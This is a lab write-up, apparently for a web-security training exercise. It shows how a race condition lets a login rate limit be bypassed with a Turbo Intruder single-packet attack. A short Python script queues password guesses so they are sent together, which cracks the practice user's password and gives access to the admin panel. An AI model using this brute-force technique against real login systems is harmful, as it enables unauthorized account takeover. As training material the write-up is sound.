---
title: "Lab 2 - Bypassing rate limits via race conditions"
---

In this lab we are tasked with bruteforcing the password for the user account `carlos`  and access the admin panel and delete the user `carlos` all this by bypassing the rate limit by exploiting the race condiiton flaw in authentication mechanism.

`Date: 4 September 2026`

## Table of Content 

1. [Initial Recon](#initial-recon)
2. [Exploitation](#exploitation)
3. [Conclusion](#conclusion)

### Initial Recon

![7a7a85d829b60f0de528c5e36e6cb389.png](/7a7a85d829b60f0de528c5e36e6cb389.png)

We have this login page available let's check whether the rate limit is there or not by entering the wrong password for carlos the no. of times it allows.

![5c1dac5605ba5cdd9a1e4874dbe48f9a.png](/5c1dac5605ba5cdd9a1e4874dbe48f9a.png)


After `4` failed trials we are locked for 60 seconds. 

## Exploitation

Now let's intercept the request in burp and send the login request to burp extension turbo intruder.

![Screenshot From 2026-09-03 12-05-58.png](/Screenshot%20From%202026-09-03%2012-05-58.png)

![f6de5d73c9c7d91a18b29912c2a2d9e4.png](/f6de5d73c9c7d91a18b29912c2a2d9e4.png)

In the drop down menu select the `example/race-single-packet-attack.py`

Also in the request body replace the password with `%s` :

![2a7eeadced25deefea23e2fc4cb0f608.png](/2a7eeadced25deefea23e2fc4cb0f608.png)

Now we need to make little changes to the python script for our use case - 

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete
    for word in wordlists.clipboard:
        engine.queue(target.req,word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

This script will choose password from our clipboard and replace the `%s` with each password when sending the request in parellel means trying all the passwords at once so the password attempt counter will be 1.


Now run the attack - 

![987826d86da89c5d9b75505693de43fe.png](/987826d86da89c5d9b75505693de43fe.png)

Here we can see for the entry `carlos:master` we got `302` means we cracked the password.

Let's try to login and complete the task : 

Access the Admin Panel and delete the user carlos - 

![7e6b9a6c9205e849e97697532e32f5f8.png](/7e6b9a6c9205e849e97697532e32f5f8.png)

Challenge Solved!

## Conclusion

The lab was successfully exploited by leveraging a race condition in the authentication mechanism to bypass the login rate limit. By sending multiple password attempts simultaneously using Turbo Intruder's single-packet attack, we were able to bypass the attempt counter, brute-force Carlos's password, access the admin panel, and delete the carlos user.
